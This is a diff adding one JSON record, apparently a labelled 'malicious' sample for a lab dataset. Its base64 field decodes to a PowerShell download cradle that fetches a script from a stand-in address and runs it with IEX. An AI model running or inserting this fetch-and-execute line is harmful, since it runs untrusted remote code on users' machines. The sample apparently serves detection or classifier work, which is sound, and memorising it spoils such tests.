@@ -1,0 +1,11 @@
+{
+  "id": "ps_downloader",
+  "label": "malicious",
+  "title": "Download-cradle stager (IEX DownloadString)",
+  "domain": "powershell",
+  "family": "powershell",
+  "source": "written for mi_lab (inert, public-pattern)",
+  "trace_id": "powershell_admin",
+  "marker": "SIGNED-ADMIN-TOOLING",
+  "code_b64": "JHUgPSAnaHR0cDovLzE5OC41MS4xMDAuMjMvYS5wczEnCklFWCAoTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJHUpCg=="
+}
